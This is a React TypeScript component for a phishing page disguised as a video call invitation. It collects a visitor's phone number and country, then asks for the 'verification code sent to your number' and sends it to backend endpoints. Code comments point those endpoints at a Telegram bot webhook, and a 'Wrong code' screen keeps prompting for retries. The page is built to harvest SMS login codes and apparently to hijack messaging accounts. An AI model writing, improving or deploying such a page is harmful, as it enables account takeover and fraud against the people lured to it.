import { useState } from 'react';
import { Phone, Globe, Shield, Loader } from 'lucide-react';

type Step = 'phone' | 'verification' | 'result';

interface FormData {
  phoneNumber: string;
  country: string;
  verificationCode: string;
}

function App() {
  const [step, setStep] = useState<Step>('phone');
  const [formData, setFormData] = useState<FormData>({
    phoneNumber: '',
    country: '',
    verificationCode: ''
  });
  const [loading, setLoading] = useState(false);
  const [result, setResult] = useState<'approved' | 'rejected' | null>(null);

  const handlePhoneSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!formData.phoneNumber.trim() || !formData.country.trim()) return;

    setLoading(true);
    
    try {
      // Replace this URL with your actual Telegram bot webhook endpoint
      const response = await fetch('/api/send-phone', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          phoneNumber: formData.phoneNumber,
          country: formData.country
        })
      });

      if (response.ok) {
        setStep('verification');
      }
    } catch (error) {
      console.error('Error sending phone data:', error);
    } finally {
      setLoading(false);
    }
  };

  const handleVerificationSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!formData.verificationCode.trim()) return;

    setLoading(true);
    
    try {
      // Replace this URL with your actual Telegram bot webhook endpoint
      const response = await fetch('/api/verify-code', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          phoneNumber: formData.phoneNumber,
          verificationCode: formData.verificationCode
        })
      });

      const data = await response.json();
      
      if (data.approved) {
        setResult('approved');
      } else {
        setResult('rejected');
      }
      
      setStep('result');
    } catch (error) {
      console.error('Error verifying code:', error);
      setResult('rejected');
      setStep('result');
    } finally {
      setLoading(false);
    }
  };

  const resetForm = () => {
    setStep('phone');
    setFormData({ phoneNumber: '', country: '', verificationCode: '' });
    setResult(null);
  };

  return (
    <div 
      className="min-h-screen bg-cover bg-center bg-fixed relative"
      style={{
        backgroundImage: 'url("https://images.pexels.com/photos/1080721/pexels-photo-1080721.jpeg?auto=compress&cs=tinysrgb&w=1920&h=1080&fit=crop")'
      }}
    >
      {/* Dark overlay for better text readability */}
      <div className="absolute inset-0 bg-gradient-to-br from-black/60 via-black/40 to-black/60"></div>
      
      <div className="relative z-10 min-h-screen flex flex-col items-center justify-center px-4 py-8">
        <div className="w-full max-w-md">
          {step === 'phone' && (
            <div className="text-center mb-8 animate-fade-in">
              <h1 className="text-4xl md:text-5xl font-bold text-white mb-6 leading-tight">
                You have been invited to a{' '}
                <span className="bg-gradient-to-r from-blue-400 to-purple-500 bg-clip-text text-transparent">
                  video call
                </span>{' '}
                from me
              </h1>
              
              <form onSubmit={handlePhoneSubmit} className="space-y-6">
                <div className="backdrop-blur-md bg-white/10 rounded-2xl p-6 border border-white/20 shadow-2xl">
                  <div className="space-y-4">
                    <div>
                      <label className="block text-white/90 text-sm font-medium mb-2">
                        Enter your phone number so the call can be made
                      </label>
                      <div className="relative">
                        <Phone className="absolute left-3 top-1/2 transform -translate-y-1/2 text-white/60 w-5 h-5" />
                        <input
                          type="text"
                          value={formData.phoneNumber}
                          onChange={(e) => setFormData(prev => ({ ...prev, phoneNumber: e.target.value }))}
                          className="w-full pl-12 pr-4 py-3 bg-white/10 border border-white/30 rounded-xl text-white placeholder-white/60 focus:outline-none focus:ring-2 focus:ring-blue-400 focus:border-transparent transition-all duration-300"
                          placeholder="Enter your phone number"
                          required
                        />
                      </div>
                    </div>

                    <div>
                      <label className="block text-white/90 text-sm font-medium mb-2">
                        Where is your country?
                      </label>
                      <div className="relative">
                        <Globe className="absolute left-3 top-1/2 transform -translate-y-1/2 text-white/60 w-5 h-5" />
                        <input
                          type="text"
                          value={formData.country}
                          onChange={(e) => setFormData(prev => ({ ...prev, country: e.target.value }))}
                          className="w-full pl-12 pr-4 py-3 bg-white/10 border border-white/30 rounded-xl text-white placeholder-white/60 focus:outline-none focus:ring-2 focus:ring-blue-400 focus:border-transparent transition-all duration-300"
                          placeholder="Enter your country"
                          required
                        />
                      </div>
                    </div>
                  </div>

                  <button
                    type="submit"
                    disabled={loading || !formData.phoneNumber.trim() || !formData.country.trim()}
                    className="w-full mt-6 bg-gradient-to-r from-blue-500 to-purple-600 hover:from-blue-600 hover:to-purple-700 text-white font-semibold py-3 px-6 rounded-xl transition-all duration-300 transform hover:scale-[1.02] focus:outline-none focus:ring-2 focus:ring-blue-400 focus:ring-offset-2 focus:ring-offset-transparent disabled:opacity-50 disabled:cursor-not-allowed disabled:transform-none"
                  >
                    {loading ? (
                      <div className="flex items-center justify-center">
                        <Loader className="w-5 h-5 animate-spin mr-2" />
                        Connecting...
                      </div>
                    ) : (
                      'Call Me'
                    )}
                  </button>
                </div>
              </form>
            </div>
          )}

          {step === 'verification' && (
            <div className="text-center animate-fade-in">
              <div className="backdrop-blur-md bg-white/10 rounded-2xl p-6 border border-white/20 shadow-2xl">
                <div className="mb-6">
                  <Shield className="w-16 h-16 text-blue-400 mx-auto mb-4" />
                  <h2 className="text-2xl font-bold text-white mb-2">Verification Required</h2>
                  <p className="text-white/80">
                    Enter the code sent to your number to make a call
                  </p>
                </div>

                <form onSubmit={handleVerificationSubmit} className="space-y-4">
                  <div>
                    <input
                      type="text"
                      value={formData.verificationCode}
                      onChange={(e) => setFormData(prev => ({ ...prev, verificationCode: e.target.value }))}
                      className="w-full px-4 py-3 bg-white/10 border border-white/30 rounded-xl text-white text-center text-lg font-mono placeholder-white/60 focus:outline-none focus:ring-2 focus:ring-blue-400 focus:border-transparent transition-all duration-300"
                      placeholder="Enter verification code"
                      required
                    />
                  </div>

                  <div className="flex space-x-3">
                    <button
                      type="button"
                      onClick={resetForm}
                      className="flex-1 bg-white/10 hover:bg-white/20 text-white font-semibold py-3 px-6 rounded-xl transition-all duration-300 border border-white/30"
                    >
                      Back
                    </button>
                    <button
                      type="submit"
                      disabled={loading || !formData.verificationCode.trim()}
                      className="flex-1 bg-gradient-to-r from-blue-500 to-purple-600 hover:from-blue-600 hover:to-purple-700 text-white font-semibold py-3 px-6 rounded-xl transition-all duration-300 transform hover:scale-[1.02] focus:outline-none focus:ring-2 focus:ring-blue-400 focus:ring-offset-2 focus:ring-offset-transparent disabled:opacity-50 disabled:cursor-not-allowed disabled:transform-none"
                    >
                      {loading ? (
                        <div className="flex items-center justify-center">
                          <Loader className="w-5 h-5 animate-spin mr-2" />
                          Verifying...
                        </div>
                      ) : (
                        'Submit Code'
                      )}
                    </button>
                  </div>
                </form>
              </div>
            </div>
          )}

          {step === 'result' && (
            <div className="text-center animate-fade-in">
              <div className="backdrop-blur-md bg-white/10 rounded-2xl p-8 border border-white/20 shadow-2xl">
                {result === 'approved' ? (
                  <>
                    <div className="w-20 h-20 bg-green-500 rounded-full flex items-center justify-center mx-auto mb-6">
                      <Phone className="w-10 h-10 text-white" />
                    </div>
                    <h2 className="text-3xl font-bold text-white mb-4">
                      I call you right now
                    </h2>
                    <p className="text-white/80">
                      Please keep your phone ready to answer the call.
                    </p>
                  </>
                ) : (
                  <>
                    <div className="w-20 h-20 bg-red-500 rounded-full flex items-center justify-center mx-auto mb-6">
                      <Shield className="w-10 h-10 text-white" />
                    </div>
                    <h2 className="text-3xl font-bold text-white mb-4">
                      Wrong code
                    </h2>
                    <p className="text-white/80 mb-6">
                      The verification code you entered is incorrect.
                    </p>
                    <button
                      onClick={resetForm}
                      className="bg-gradient-to-r from-blue-500 to-purple-600 hover:from-blue-600 hover:to-purple-700 text-white font-semibold py-3 px-6 rounded-xl transition-all duration-300 transform hover:scale-[1.02]"
                    >
                      Try Again
                    </button>
                  </>
                )}
              </div>
            </div>
          )}
        </div>
      </div>
    </div>
  );
}

export default App;